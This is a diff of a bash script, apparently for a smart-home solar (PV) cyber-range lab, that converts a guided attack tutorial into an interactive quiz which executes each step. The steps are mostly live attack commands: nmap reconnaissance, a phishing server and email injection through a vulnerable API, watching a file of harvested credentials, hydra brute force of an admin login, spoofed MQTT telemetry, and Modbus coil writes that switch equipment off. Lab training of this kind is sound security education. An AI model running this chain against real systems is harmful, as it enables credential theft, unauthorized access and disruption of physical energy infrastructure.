@@ -2,10 +2,11 @@
 set -euo pipefail
 
 # =========================
-# Smart Home PV - Guided Attack Tutorial
+# Smart Home PV - Interactive Attack Walkthrough
 # =========================
-# This script is intentionally educational for the lab environment.
-# It explains each action and then executes it.
+# This script is an interactive learning experience.
+# You will be presented with a scenario and must CHOOSE the correct command/strategy.
+# Correct answers explain the "Why"; wrong answers provide hints.
 
 RED='\033[0;31m'
 GREEN='\033[0;32m'
@@ -189,21 +190,74 @@ teach_cmd() {
   fi
 }
 
-required_tools=(nmap curl grep sed cut)
-missing_tools=()
-for tool in "${required_tools[@]}"; do
-  if ! command -v "$tool" >/dev/null 2>&1; then
-    missing_tools+=("$tool")
+# NEW: Interactive Quiz Function
+quiz_cmd() {
+  local title="$1"
+  local question="$2"
+  local correct_idx="$3"
+  local exec_command="$4"
+  local explanation="$5"
+  shift 5
+  local options=("$@")
+
+  echo -e "\n${YELLOW}[?] ${WHITE}${title}${NC}"
+  echo -e "${GRAY}${question}${NC}"
+  
+  local i=1
+  for opt in "${options[@]}"; do
+    echo -e "   ${CYAN}${i})${NC} ${opt}"
+    ((i++))
+  done
+
+  if [[ "${AUTO_MODE}" == true ]]; then
+    echo -e "${YELLOW}[!] Auto-selecting correct answer: ${correct_idx}${NC}"
+    echo -e "${GREEN}>>> ${explanation}${NC}"
+    echo -e "${YELLOW}[*] Executing the attack step...${NC}"
+    set +e
+    eval "${exec_command}"
+    local rc=$?
+    set -e
+    if [[ $rc -eq 0 ]]; then
+      echo -e "${GREEN}[✓] Step Verified${NC}"
+    else
+      echo -e "${YELLOW}[!] Step finished with code ${rc}${NC}"
+    fi
+    return
   fi
-done
 
-if [[ ${#missing_tools[@]} -gt 0 ]]; then
-  echo -e "${RED}[!] Missing required tools:${NC} ${missing_tools[*]}"
-  echo -e "${YELLOW}Install them and run again.${NC}"
-  exit 1
-fi
+  while true; do
+    echo -ne "${MAGENTA}    Select (1-${#options[@]}): ${NC}"
+    read -r choice
+    
+    if [[ "${choice}" == "skip" ]]; then
+      echo -e "${YELLOW}[!] Skipping quiz...${NC}"
+      break
+    fi
 
-echo -e "${MAGENTA}██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗     ██╗      █████╗ ██████╗ ${NC}"
+    if [[ "${choice}" == "${correct_idx}" ]]; then
+      echo -e "${GREEN}[✓] Correct!${NC}"
+      echo -e "${WHITE}----------------------------------------------------------------${NC}"
+      echo -e "${WHITE}${explanation}${NC}"
+      echo -e "${WHITE}----------------------------------------------------------------${NC}"
+      sleep 2
+      break
+    else
+      echo -e "${RED}[x] Incorrect.${NC}"
+      echo -e "    ${GRAY}Hint: Some options are too aggressive, too slow, or target the wrong service.${NC}"
+    fi
+  done
+
+  echo -e "${YELLOW}[*] Executing the attack step...${NC}"
+  set +e
+  eval "${exec_command}"
+  local rc=$?
+  set -e
+  if [[ $rc -eq 0 ]]; then
+    echo -e "${GREEN}[✓] Step Verified${NC}"
+  else
+    echo -e "${YELLOW}[!] Step finished with code ${rc}${NC}"
+  fi
+}
 echo -e "${MAGENTA}██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗    ██║     ██╔══██╗██╔══██╗${NC}"
 echo -e "${MAGENTA}███████║███████║██║     █████╔╝ █████╗  ██████╔╝    ██║     ███████║██████╔╝${NC}"
 echo -e "${MAGENTA}██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗    ██║     ██╔══██║██╔══██╗${NC}"
@@ -221,23 +275,20 @@ fi
 
 pause_step
 
+# PHASE 1: RECON
 step_header "PHASE 1 - Recon: One Scan To Rule Them All"
 explain "Realistically, you don’t spam Nmap over and over — you do ONE purposeful sweep."
-explain "Goal: find hosts that expose the handful of services we care about in this lab:"
-explain "  - 8081  (web admin/API)"
-explain "  - 1883  (MQTT broker)"
-explain "  - ${MODBUS_PORT} (Modbus control channel)"
-explain "Command anatomy:"
-explain "  - -n       = no DNS lookups (faster, avoids noisy resolver traffic)"
-explain "  - -T4      = faster timing template (trade stealth for speed in a lab)"
-explain "  - -p ...   = only scan relevant ports (signal > noise)"
-explain "  - --open   = only show hosts with something open (reduces clutter)"
+explain "Goal: Find web (8081), MQTT (1883), and Modbus (${MODBUS_PORT})."
 
-teach_cmd \
-  "Run a focused subnet sweep (discover + port triage)" \
-  "nmap -n -T4 -p 8081,1883,${MODBUS_PORT} --open ${SUBNET}" \
+quiz_cmd \
+  "Network Scanning Strategy" \
+  "Which Nmap command is best optimized for this lab (speed + stealth + focus)?" \
+  3 \
   "nmap -n -T4 -p 8081,1883,${MODBUS_PORT} --open ${SUBNET} -oG ${OUT_DIR}/01_recon.gnmap" \
-  "Use 'why' to learn the flags: -n no DNS, -T4 faster timing, -p selects ports, --open reduces noise."
+  "Great choice! Using '-n' skips DNS (fast), '-T4' accelerates packet sending, and '-p' focuses ONLY on relevant ports to stay quiet. Scanning all 65k ports is noisy and slow." \
+  "nmap -A -sV ${SUBNET} (Aggressive everything scan)" \
+  "nmap -p- ${SUBNET} (Scan all 65,535 ports slowly)" \
+  "nmap -n -T4 -p 8081,1883,${MODBUS_PORT} --open ${SUBNET}"
 
 echo "# host,web,mqtt,modbus,score" > "${OUT_DIR}/02_scoring.csv"
 
@@ -303,20 +354,26 @@ pause_step
 
 step_header "PHASE 2 - Web Recon: Pull Public Data"
 explain "Web APIs often leak operational data without authentication."
-explain "We use curl with strict timeouts so the tutorial never hangs." 
-explain "  - -sS                 = quiet output but still show errors"
-explain "  - --connect-timeout 3 = fail fast if host is down"
-explain "  - --max-time 6        = hard cap total request time"
-teach_cmd \
-  "Probe /wifi_scan endpoint" \
-  "curl -sS --connect-timeout 3 --max-time 6 http://${target_host}:8081/wifi_scan" \
+
+quiz_cmd \
+  "Web Reconnaissance Tool Selection" \
+  "Which tool is best suited for scriptable, non-interactive HTTP requests in this terminal environment?" \
+  2 \
   "curl -sS --connect-timeout 3 --max-time 6 http://${target_host}:8081/wifi_scan | tee ${OUT_DIR}/04_wifi_scan.json" \
-  "-sS keeps output clean but surfaces errors; timeouts prevent hangs. Response is saved silently."
-teach_cmd \
-  "Probe /api/challenge/status endpoint" \
-  "curl -sS --connect-timeout 3 --max-time 6 http://${target_host}:8081/api/challenge/status" \
+  "Correct! 'curl' is perfect for command-line HTTP interaction. We add timeouts to prevent hanging if the host is flaky." \
+  "firefox http://${target_host}:8081/wifi_scan (GUI Browser)" \
+  "curl -sS --connect-timeout 3 --max-time 6 http://${target_host}:8081/wifi_scan" \
+  "ping ${target_host} (Network connectivity check)"
+
+quiz_cmd \
+  "Validating Attack Impact" \
+  "Why is it important to check the '/api/challenge/status' endpoint during an attack?" \
+  1 \
   "curl -sS --connect-timeout 3 --max-time 6 http://${target_host}:8081/api/challenge/status | tee ${OUT_DIR}/04_challenge_status.json" \
-  "Status endpoints often reveal whether your actions had an effect."
+  "Exactly. In a cyber range (and real ops), you need feedback loops to know if your actions (like shutting down the PV system) actually worked." \
+  "To verify if our attack caused a change in the system state (impact analysis)" \
+  "To download the entire website source code" \
+  "To crash the server by overloading it"
 
 if grep -qi "BSY{" "${OUT_DIR}/04_wifi_scan.json" 2>/dev/null; then
   echo -e "${GREEN}[✓] Potential flag/token artifact observed in wifi_scan output.${NC}"
@@ -341,23 +398,35 @@ if [[ "${WITH_PHISHING}" == true ]]; then
       explain "Hint: your reachable host IP often looks like: ${SUGGESTED_EXTERNAL_HOST}"
     fi
 
-    teach_cmd \
-      "Start the phishing server (runs in background)" \
+    quiz_cmd \
+      "Phishing Server Configuration" \
+      "Why must we set the EXTERNAL_HOST variable when starting the phishing server?" \
+      2 \
       "EXTERNAL_HOST=${SUGGESTED_EXTERNAL_HOST:-YOUR_IP_HERE} ./start_phishing_server.sh &" \
-      "EXTERNAL_HOST=${SUGGESTED_EXTERNAL_HOST:-YOUR_IP_HERE} ./start_phishing_server.sh &" \
-      "EXTERNAL_HOST is the IP the victim can reach; '&' backgrounds the server. Watch /tmp/harvested.txt for creds."
+      "Correct. The victim (simulated user) needs to know which IP addresses to send their typed passwords to. Using 'localhost' would fail because the victim isn't on your machine." \
+      "To configure the port the server listens on locally" \
+      "To tell the victim which IP address to send their credentials back to (Callback IP)" \
+      "To bypass the network firewall rules"
 
-    teach_cmd \
-      "Trigger phishing email (simulates sending email to victim)" \
+    quiz_cmd \
+      "Delivering the Payload" \
+      "How do we get the victim to visit our phishing site in this scenario?" \
+      1 \
       "curl -X POST -H 'Content-Type: application/json' -d '{\"subject\":\"Urgent: PV System Update\",\"link\":\"http://${SUGGESTED_EXTERNAL_HOST:-YOUR_IP}:8001/login.html\"}' http://${target_host}:8081/api/send_phishing_email && (for i in {1..3}; do curl -s -X POST -H 'Content-Type: application/json' -d '{\"message\":\"Urgent: Security Update Required\",\"url\":\"http://${SUGGESTED_EXTERNAL_HOST:-YOUR_IP}:8001/login.html\"}' http://${target_host}:8081/api/attacker/phishing; sleep 20; done &)" \
-      "curl -X POST -H 'Content-Type: application/json' -d '{\"subject\":\"Urgent: PV System Update\",\"link\":\"http://${SUGGESTED_EXTERNAL_HOST:-YOUR_IP}:8001/login.html\"}' http://${target_host}:8081/api/send_phishing_email && for i in {1..3}; do curl -s -X POST -H 'Content-Type: application/json' -d '{\"message\":\"Urgent: Security Update Required\",\"url\":\"http://${SUGGESTED_EXTERNAL_HOST:-YOUR_IP}:8001/login.html\"}' http://${target_host}:8081/api/attacker/phishing; sleep 20; done &" \
-      "Sends an email to the victim's inbox AND repeatedly triggers dashboard notifications (3x) every 20s (backgrounded)."
+      "Yes! We exploit an API vulnerability to 'inject' a notification/email to the legitimate user, tricking them into clicking our link." \
+      "By injecting a fake email/notification via a vulnerable API endpoint" \
+      "By manually sending an email from a Gmail account" \
+      "By hoping they randomly browse to our IP address"
 
-    teach_cmd \
-      "Watch for harvested creds (timeout 5m, or stops when creds found)" \
-      "timeout 300 bash -c 'tail -f /tmp/harvested.txt | grep --line-buffered -m 1 \":\"'" \
-      "timeout 300 bash -c 'tail -f /tmp/harvested.txt | grep --line-buffered -m 1 \":\"'" \
-      "Waits up to 5 minutes for credentials in /tmp/harvested.txt. Exits immediately if creds are captured."
+    quiz_cmd \
+      "Credential Harvesting Strategy" \
+      "Why use 'grep -m 1' when watching the harvested credentials file?" \
+      2 \
+      "timeout 300 bash -c 'tail -f /tmp/harvested.txt | grep --line-buffered -m 1 \":\"' || echo -e \"\n${YELLOW}[!] Phishing timed out (no credentials captured). Moving to brute force...${NC}\"" \
+      "Smart. We want the script to continue automatically the moment we get ONE credential. Waiting for more is unnecessary." \
+      "To filter out all lines that don't contain errors" \
+      "To stop waiting immediately after the FIRST credential is captured (Success condition)" \
+      "To ensure we capture at least 100 passwords before stopping"
   else
     echo -e "${YELLOW}[!] Missing helper script: ${SCRIPT_DIR}/start_phishing_server.sh${NC}"
   fi
@@ -371,11 +440,15 @@ explain "We’ll do this against the lab web login endpoint."
 explain "First: learn what a failed login response looks like so hydra can detect failures."
 explain "Hydra needs a failure signature (F=...) so it knows when a guess is WRONG." 
 
-teach_cmd \
-  "Send a known-bad login to observe the failure response" \
-    "curl -sS -X POST http://${target_host}:8081/api/admin/login -H 'Content-Type: application/json' -d '{\"username\":\"admin\",\"password\":\"WRONGPASS\"}'" \
-    "curl -sS -X POST http://${target_host}:8081/api/admin/login -H 'Content-Type: application/json' -d '{\"username\":\"admin\",\"password\":\"WRONGPASS\"}'" \
-    "You need a stable failure marker string from the response to configure hydra's F=... rule (e.g., Invalid/Unauthorized/error)."
+quiz_cmd \
+  "Calibrating the Brute-Force Tool" \
+  "Why do we first send a login request with a known WRONG password?" \
+  3 \
+  "curl -sS -X POST http://${target_host}:8081/api/admin/login -H 'Content-Type: application/json' -d '{\"username\":\"admin\",\"password\":\"WRONGPASS\"}'" \
+  "Exactamundo. Automated tools like Hydra need to know what 'failure' looks like (e.g., the word 'error' in JSON response) so they can tell when a login SUCCEEDS (by process of elimination)." \
+  "To lock the account out immediately" \
+  "To check if the server is online" \
+  "To identify the failure signature (F=...) for Hydra config"
 
 if command -v hydra >/dev/null 2>&1; then
   explain "Create a tiny wordlist (training-sized). In real ops, you’d use larger lists." 
@@ -389,19 +462,28 @@ if command -v hydra >/dev/null 2>&1; then
   # Keep the wordlist artifact in OUT_DIR, but let the learner work with a simple local filename.
   run_cmd "Preparing wordlist artifact in background" "ln -sf ${OUT_DIR}/wordlist.txt ./wordlist.txt"
 
-  teach_cmd \
-    "Create a password list containing the correct password" \
-    "echo -e 'admin\nadmin123\npassword\npassword123\nletmein\nsuper-secret-123\nqwerty\n12345678' > wordlist.txt" \
+  quiz_cmd \
+    "Wordlist preparation" \
+    "Why is 'password' included in our wordlist?" \
+    1 \
     "echo -e 'admin\nadmin123\npassword\npassword123\nletmein\nsuper-secret-123\nqwerty\n12345678' > ${OUT_DIR}/wordlist.txt" \
-    "One password per line; hydra consumes this with -P. Verification: cat wordlist.txt"
+    "Correct. It remains one of the most common default passwords. Always start with the path of least resistance." \
+    "Because it's a common default password often overlooked" \
+    "It is required by the Hydra syntax" \
+    "To pad the file size"
 
   explain "Now run hydra. Set F=error since the API returns JSON with an 'error' field on failure."
   explain "We pre-filled the command for you to make it easier."
-  teach_cmd \
-    "Run hydra against the HTTP login" \
-    "hydra -l admin -P wordlist.txt -s 8081 -t 4 -f -V ${target_host} http-post-form '/api/admin/login:username=^USER^&password=^PASS^:F=error'" \
-    "hydra -l admin -P ${OUT_DIR}/wordlist.txt -s 8081 -t 4 -f -V ${target_host} http-post-form '/api/admin/login:username=^USER^&password=^PASS^:F=error'" \
-    "-l user, -P wordlist, -s port, -t threads, -f stop on success, -V verbose."
+  
+  quiz_cmd \
+    "Efficient Cracking Strategy" \
+    "Which Hydra flag ensures we stop immediately once the correct password is found?" \
+    2 \
+    "hydra -l admin -P ${OUT_DIR}/wordlist.txt -s 8081 -t 4 -f -V ${target_host} http-post-form '/api/admin/login:username=^USER^&password=^PASS^:F=error' || echo -e \"\n${YELLOW}[!] Brute force finished (check output for success/failure).${NC}\"" \
+    "Right! The '-f' flag (exit on found) saves time and reduces noise once the objective is met." \
+    "-l (Login user)" \
+    "-f (Exit on first found credential)" \
+    "-t 4 (Limit parallel tasks)"
 else
   echo -e "${YELLOW}[!] hydra not installed; skipping brute-force demo.${NC}"
   echo -e "${GRAY}If you add hydra to the attacker container, re-run this phase.${NC}"
@@ -418,18 +500,26 @@ explain "  - -C 1        = exit after 1 message"
 mqtt_host="$(sed -n -E 's/^([^,]+),[^,]+,1,.*/\1/p' "${OUT_DIR}/02_scoring.csv" | sed -n '1p' || true)"
 if [[ -n "${mqtt_host}" ]]; then
   if command -v mosquitto_sub >/dev/null 2>&1; then
-    teach_cmd \
-      "Subscribe to pv/# (wildcard) to grab any telemetry or status" \
-      "timeout 45 mosquitto_sub -h ${mqtt_host} -t 'pv/#' -C 1" \
-      "timeout 45 mosquitto_sub -h ${mqtt_host} -t 'pv/#' -C 1 | tee ${OUT_DIR}/06_mqtt_sample.txt" \
-      "-h broker, -t 'pv/#' grabs ANY message under pv/ (telemetry or status). -C 1 exits after first match."
+    quiz_cmd \
+      "MQTT Reconnaissance" \
+      "Why do we use the wildcard topic 'pv/#' instead of a specific topic like 'pv/telemetry'?" \
+      1 \
+      "timeout 45 mosquitto_sub -h ${mqtt_host} -t 'pv/#' -C 1 | tee ${OUT_DIR}/06_mqtt_sample.txt || echo -e \"\n${YELLOW}[!] MQTT capture timed out (no traffic). Continuing...${NC}\"" \
+      "Correct. We don't know the exact topics yet. The '#' wildcard subscribes to EVERYTHING under 'pv/', allowing us to discover active topics." \
+      "To subscribe to all topics under 'pv/' recursively to discover what is available" \
+      "To optimize the network bandwidth" \
+      "To encrypt the MQTT connection"
 
     # NEW: Spoof random telemetry values every 0.5s for 5 seconds to actively poison the broker
-    teach_cmd \
-      "(Active Attack) Inject fake telemetry with random power spikes" \
+    quiz_cmd \
+      "Data Integrity Attack" \
+      "What is the operational impact of injecting random, high-value power readings?" \
+      2 \
       "for i in {1..10}; do power=\$((RANDOM % 5000 + 100)); mosquitto_pub -h ${mqtt_host} -t 'pv/telemetry' -m \"{\\\"power_kw\\\":\$power,\\\"voltage_v\\\":240,\\\"timestamp\\\":\$(date +%s)}\"; sleep 0.5; done" \
-      "for i in {1..10}; do power=\$((RANDOM % 5000 + 100)); mosquitto_pub -h ${mqtt_host} -t 'pv/telemetry' -m \"{\\\"power_kw\\\":\$power,\\\"voltage_v\\\":240,\\\"timestamp\\\":\$(date +%s)}\"; sleep 0.5; done" \
-      "Injects random 'power' values into the pv/telemetry topic rapidly, creating fake data on the dashboard."
+      "Exactly. By injecting fake data, we compromise the *Integrity* of the system. The operator sees false spikes and might shut down the plant unnecessarily." \
+      "It causes a Denial of Service (DoS) by filling the disk" \
+      "It confuses the operator with false data (Integrity violation), potentially forcing a manual shutdown" \
+      "It enables remote code execution on the broker"
   else
     echo -e "${YELLOW}[!] mosquitto_sub not installed; skipping live MQTT capture.${NC}"
   fi
@@ -451,29 +541,45 @@ explain "  - Value field   (2 bytes) -> 0xFF00 = ON, 0x0000 = OFF"
 explain "We’ll set these via environment variables so you can iterate quickly." 
 
 if [[ -f "${SCRIPT_DIR}/attacker_modbus.py" ]]; then
-  teach_cmd \
-    "(Packet mod) Set coil address + value for this run" \
+  quiz_cmd \
+    "Modbus Protocol Exploitation" \
+    "What is the fundamental security weakness of standard Modbus/TCP that allows this attack?" \
+    1 \
     "export MODBUS_COIL_ADDR=1 MODBUS_COIL_VALUE=1" \
-    "export MODBUS_COIL_ADDR=1 MODBUS_COIL_VALUE=1" \
-    "This changes the Modbus PDU fields without editing code: address selects the coil, value is ON/OFF."
+    "Correct. Standard Modbus/TCP (port 502) has NO authentication. Any device that can connect can send read/write commands." \
+    "Lack of Authentication (Anyone on the network can read/write)" \
+    "Weak encryption algorithms" \
+    "Complex password requirements"
 
-  teach_cmd \
-    "Execute Modbus write helper against ${target_host}:${MODBUS_PORT}" \
-    "python3 ./attacker_modbus.py ${target_host} ${MODBUS_PORT}" \
+  quiz_cmd \
+    "Executing the Control Command" \
+    "We are using Function Code 0x05. What does this specific code do?" \
+    3 \
     "python3 ${SCRIPT_DIR}/attacker_modbus.py ${target_host} ${MODBUS_PORT} | tee ${OUT_DIR}/05_modbus_action.log" \
-    "This script uses Function Code 0x05 (Write Single Coil). Use 'why' to learn which bytes you changed."
+    "Spot on. FC 0x05 is 'Write Single Coil', used to toggle binary outputs (Relays, LEDs, etc.)." \
+    "Read Holding Registers (FC 0x03)" \
+    "Write Multiple Registers (FC 0x10)" \
+    "Write Single Coil (FC 0x05) - forcing an output ON/OFF"
 
-  teach_cmd \
-    "(Packet mod) Flip the coil value (simulate toggling control)" \
+  quiz_cmd \
+    "Modifying the Attack Payload" \
+    "We are now setting the value to 0. What is the physical effect of writing 0x0000 to a coil?" \
+    1 \
     "export MODBUS_COIL_VALUE=0" \
-    "export MODBUS_COIL_VALUE=0" \
-    "You are modifying the payload: 0=OFF (0x0000), 1=ON (0xFF00) for write-coil semantics."
+    "Correct. In Modbus coils, 0x0000 means OFF and 0xFF00 means ON." \
+    "Turning the targeted device/output OFF" \
+    "Turning the targeted device/output ON" \
+    "Rebooting the controller"
 
-  teach_cmd \
-    "Run the write again with the modified value" \
-    "python3 ./attacker_modbus.py ${target_host} ${MODBUS_PORT}" \
+  quiz_cmd \
+    "Completing the Attack Cycle" \
+    "Why do we run the Python script a second time?" \
+    2 \
     "python3 ${SCRIPT_DIR}/attacker_modbus.py ${target_host} ${MODBUS_PORT} | tee -a ${OUT_DIR}/05_modbus_action.log" \
-    "Expect a second transaction with a different value; compare output fields."
+    "Yes. The environment variable change only staged the value locally. Re-running the script actually sends the new Modbus/TCP packet to the victim." \
+    "Because the first attempt usually fails due to network latency" \
+    "To transmit the new modifying payload (OFF command) to the victim" \
+    "To verify connectivity is still active"
 else
   echo -e "${RED}[!] Missing helper: ${SCRIPT_DIR}/attacker_modbus.py${NC}"
 fi
